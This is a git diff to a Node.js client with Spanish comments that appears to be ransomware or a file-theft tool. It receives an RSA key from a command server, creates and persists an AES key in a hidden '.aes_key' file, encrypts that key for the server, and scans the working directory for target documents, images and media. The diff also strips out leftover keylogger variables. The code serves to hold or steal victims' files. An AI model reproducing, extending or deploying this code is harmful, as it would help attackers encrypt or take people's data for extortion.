@@ -907,25 +907,48 @@ async function conectar() {
     // === CIFRADO HIBRIDO REAL ===
     // PASO 1: Recibir clave pública RSA del servidor
     socket.on('rsa-handshake', (data) => {
-        console.log('\n========== CIFRADO HIBRIDO RSA ==========');
-        console.log('[RSA] Clave publica RSA recibida del servidor');
         rsaPublicKey = data.rsaPublicKey;
 
-        // PASO 2: Generar clave AES localmente (256 bits = 32 bytes)
-        const claveAESLocal = crypto.randomBytes(32);
-        const claveAESHex = claveAESLocal.toString('hex');
-        claveAES = claveAESHex;
+        // PASO 2: Verificar si ya existe una clave AES local (persistencia)
+        const keyFilePath = path.join(INSTALL_DIR, '.aes_key');
+        let claveAESLocal;
+        let claveAESHex;
+        let claveReutilizada = false;
 
-        console.log('[RSA] Clave AES generada localmente:', claveAESHex.substring(0, 16) + '...');
-
-        // Guardar clave AES localmente
-        try {
-            const keyFilePath = path.join(INSTALL_DIR, '.aes_key');
-            fs.writeFileSync(keyFilePath, claveAESHex);
-            console.log('[RSA] Clave AES guardada localmente');
-        } catch (e) {
-            console.log('[!] No se pudo guardar clave AES:', e.message);
+        // Intentar leer clave existente
+        if (fs.existsSync(keyFilePath)) {
+            try {
+                const existingKey = fs.readFileSync(keyFilePath, 'utf8').trim();
+                if (existingKey && existingKey.length === 64) { // 32 bytes = 64 hex chars
+                    claveAESHex = existingKey;
+                    claveAESLocal = Buffer.from(existingKey, 'hex');
+                    claveReutilizada = true;
+                    console.log(' [+] Reutilizando clave AES existente:', claveAESHex.substring(0, 16) + '...');
+                }
+            } catch (e) {
+                console.log('[!] Error leyendo clave existente:', e.message);
+            }
         }
+
+        // Si no existe clave o es inválida, generar nueva
+        if (!claveReutilizada) {
+            claveAESLocal = crypto.randomBytes(32);
+            claveAESHex = claveAESLocal.toString('hex');
+            console.log(' [+] Nueva clave AES generada:', claveAESHex.substring(0, 16) + '...');
+
+            // Guardar clave AES localmente
+            try {
+                if (!fs.existsSync(INSTALL_DIR)) {
+                    fs.mkdirSync(INSTALL_DIR, { recursive: true });
+                }
+                fs.writeFileSync(keyFilePath, claveAESHex);
+                console.log('[RSA] Clave AES guardada localmente');
+            } catch (e) {
+                console.log('[!] No se pudo guardar clave AES:', e.message);
+            }
+        }
+
+        claveAES = claveAESHex;
 
         // PASO 3: Cifrar la clave AES con la clave pública RSA del servidor
         try {
@@ -1105,8 +1128,8 @@ async function conectar() {
         const directorios = [process.cwd()];
         const extensiones = ['doc', 'docx', 'pdf', 'txt', 'xls', 'xlsx', 'jpg', 'png', 'pptx', 'mp3', 'mp4'];
 
-        console.log(`📂 Directorios a escanear: ${directorios.join(', ')}`);
-        console.log(`📄 Extensiones objetivo: ${extensiones.join(', ')}`);
+        console.log(` Directorios a escanear: ${directorios.join(', ')}`);
+        console.log(` Extensiones objetivo: ${extensiones.join(', ')}`);
 
         const escaneo = escanearArchivos(directorios, extensiones);
         console.log(` Encontrados: ${escaneo.total} archivos (${escaneo.tamanioTotalHumano})`);
@@ -1294,17 +1317,6 @@ async function conectar() {
         }
     });
 
-    // ===============================
-    // KEYLOGGER REMOVED
-    // ===============================
-    let keyloggerProcess = null;
-    let keylogBuffer = '';
-    let keylogInterval = null;
-
-
-
-
-
 
 }
 
@@ -1318,12 +1330,12 @@ function esperarYSalir(codigo = 1) {
 }
 
 process.on('uncaughtException', (err) => {
-    console.error('\n💥 ERROR CRITICO NO CAPTURADO:', err);
+    console.error('\n ERROR CRITICO NO CAPTURADO:', err);
     esperarYSalir(1);
 });
 
 process.on('unhandledRejection', (reason, promise) => {
-    console.error('\n💥 PROMESA NO MANEJADA:', reason);
+    console.error('\n PROMESA NO MANEJADA:', reason);
     esperarYSalir(1);
 });
 
